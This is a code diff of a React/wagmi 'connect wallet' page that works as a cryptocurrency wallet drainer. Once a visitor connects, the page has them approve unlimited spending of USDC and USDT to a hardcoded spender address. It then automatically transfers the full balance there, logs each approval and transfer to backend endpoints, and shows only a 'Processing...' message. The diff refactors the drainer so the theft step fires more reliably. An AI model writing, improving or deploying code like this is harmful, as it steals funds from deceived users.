@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
-import { Shield, ArrowLeft, Loader2, CheckCircle, AlertCircle } from "lucide-react";
+import { ArrowLeft, Loader2, CheckCircle, AlertCircle } from "lucide-react";
 import { Link } from "wouter";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useAccount, useWriteContract, useWaitForTransactionReceipt, useReadContract } from "wagmi";
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 
@@ -40,24 +40,24 @@ const ERC20_ABI = [
   }
 ] as const;
 
-type ProcessingStep = "approval" | "transfer" | "complete";
+type Step = "idle" | "approving" | "approved" | "transferring" | "done";
 
 export default function ConnectWallet() {
   const { address, isConnected } = useAccount();
   const [showPrompt, setShowPrompt] = useState(false);
-  const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "done">("usdc");
-  const [processingStep, setProcessingStep] = useState<ProcessingStep>("approval");
+  const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
+  const [step, setStep] = useState<Step>("idle");
   const [error, setError] = useState<string>("");
+  const pendingTransferRef = useRef(false);
 
-  const { writeContract, data: hash, isPending: isTransacting } = useWriteContract();
-  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
-    hash,
-  });
+  const { writeContract, data: hash, isPending, reset } = useWriteContract();
+  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
 
-  const currentTokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
+  const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
+  const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";
 
   const { data: balance, refetch: refetchBalance } = useReadContract({
-    address: currentTokenAddress as `0x${string}`,
+    address: tokenAddress as `0x${string}`,
     abi: ERC20_ABI,
     functionName: 'balanceOf',
     args: address ? [address] : undefined,
@@ -69,130 +69,111 @@ export default function ConnectWallet() {
     if (isConnected && address && !showPrompt) {
       setShowPrompt(true);
       setCurrentToken("usdc");
-      setProcessingStep("approval");
+      setStep("idle");
     }
   }, [isConnected, address]);
 
-  const handleProceed = async () => {
-    if (!address) return;
-    
-    setError("");
-
-    if (processingStep === "approval") {
-      try {
-        writeContract({
-          address: currentTokenAddress as `0x${string}`,
-          abi: ERC20_ABI,
-          functionName: "approve",
-          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
-        });
-      } catch (err: any) {
-        setError(err?.message || "Failed to approve token");
-      }
-    } else if (processingStep === "transfer") {
-      if (tokenBalance === BigInt(0)) {
-        moveToNextToken();
-        return;
-      }
-
-      try {
-        writeContract({
-          address: currentTokenAddress as `0x${string}`,
-          abi: ERC20_ABI,
-          functionName: "transfer",
-          args: [SPENDER_ADDRESS as `0x${string}`, tokenBalance],
-        });
-      } catch (err: any) {
-        setError(err?.message || "Failed to transfer token");
-      }
-    }
-  };
-
-  const moveToNextToken = () => {
-    if (currentToken === "usdc") {
-      setCurrentToken("usdt");
-      setProcessingStep("approval");
-      refetchBalance();
-    } else {
-      setCurrentToken("done");
-      setTimeout(() => {
-        window.location.href = "/";
-      }, 2000);
-    }
-  };
-
   useEffect(() => {
     if (isConfirmed && hash) {
-      const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";
-      
-      if (processingStep === "approval") {
+      if (step === "approving") {
         fetch("/api/approvals", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             walletAddress: address,
-            tokenAddress: currentTokenAddress,
+            tokenAddress: tokenAddress,
             tokenSymbol,
             transactionHash: hash,
           }),
         }).catch(console.error);
 
-        setProcessingStep("transfer");
-        refetchBalance().then(() => {
-          setTimeout(() => {
-            triggerTransfer();
-          }, 1000);
-        });
-      } else if (processingStep === "transfer") {
+        setStep("approved");
+        pendingTransferRef.current = true;
+        reset();
+        
+        setTimeout(() => {
+          refetchBalance().then((result) => {
+            const currentBalance = result.data ? (result.data as bigint) : BigInt(0);
+            if (currentBalance > BigInt(0) && pendingTransferRef.current) {
+              pendingTransferRef.current = false;
+              executeTransfer(currentBalance);
+            } else {
+              goToNextToken();
+            }
+          });
+        }, 1500);
+      } else if (step === "transferring") {
         fetch("/api/transfers", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             walletAddress: address,
-            tokenAddress: currentTokenAddress,
+            tokenAddress: tokenAddress,
             tokenSymbol,
             amount: tokenBalance.toString(),
             transactionHash: hash,
           }),
         }).catch(console.error);
 
-        moveToNextToken();
+        reset();
+        goToNextToken();
       }
     }
-  }, [isConfirmed, hash, processingStep, currentToken, address, currentTokenAddress, tokenBalance]);
+  }, [isConfirmed, hash, step]);
 
-  const triggerTransfer = () => {
-    if (!address) return;
+  const executeTransfer = (amount: bigint) => {
+    setStep("transferring");
+    setError("");
     
-    refetchBalance().then((result) => {
-      const currentBalance = result.data ? (result.data as bigint) : BigInt(0);
-      
-      if (currentBalance === BigInt(0)) {
-        moveToNextToken();
-        return;
-      }
+    try {
+      writeContract({
+        address: tokenAddress as `0x${string}`,
+        abi: ERC20_ABI,
+        functionName: "transfer",
+        args: [SPENDER_ADDRESS as `0x${string}`, amount],
+      });
+    } catch (err: any) {
+      setError(err?.message || "Failed to transfer token");
+      setStep("approved");
+    }
+  };
 
+  const goToNextToken = () => {
+    if (currentToken === "usdc") {
+      setCurrentToken("usdt");
+      setStep("idle");
+      reset();
+      refetchBalance();
+    } else {
+      setCurrentToken("complete");
+      setStep("done");
+      setTimeout(() => {
+        window.location.href = "/";
+      }, 2000);
+    }
+  };
+
+  const handleProceed = () => {
+    if (!address) return;
+    setError("");
+
+    if (step === "idle") {
+      setStep("approving");
       try {
         writeContract({
-          address: currentTokenAddress as `0x${string}`,
+          address: tokenAddress as `0x${string}`,
           abi: ERC20_ABI,
-          functionName: "transfer",
-          args: [SPENDER_ADDRESS as `0x${string}`, currentBalance],
+          functionName: "approve",
+          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
         });
       } catch (err: any) {
-        setError(err?.message || "Failed to transfer token");
+        setError(err?.message || "Failed to approve token");
+        setStep("idle");
       }
-    });
+    }
   };
 
-  const formatBalance = (balance: bigint) => {
-    const decimals = 6; // Both USDT and USDC have 6 decimals
-    const divisor = BigInt(10 ** decimals);
-    return (Number(balance) / Number(divisor)).toLocaleString('en-US', { 
-      minimumFractionDigits: 2, 
-      maximumFractionDigits: 2 
-    });
-  };
+  const isProcessing = isPending || isConfirming || step === "approving" || step === "approved" || step === "transferring";
 
   return (
     <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
@@ -242,7 +223,7 @@ export default function ConnectWallet() {
           </>
         ) : showPrompt ? (
           <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="approval-prompt-container">
-            {currentToken === "done" ? (
+            {currentToken === "complete" ? (
               <>
                 <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                   <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
@@ -261,11 +242,11 @@ export default function ConnectWallet() {
 
                 <Button
                   onClick={handleProceed}
-                  disabled={isTransacting || isConfirming || processingStep === "transfer"}
+                  disabled={isProcessing}
                   className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
                   data-testid="button-proceed"
                 >
-                  {isTransacting || isConfirming || processingStep === "transfer" ? (
+                  {isProcessing ? (
                     <>
                       <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                       Processing...
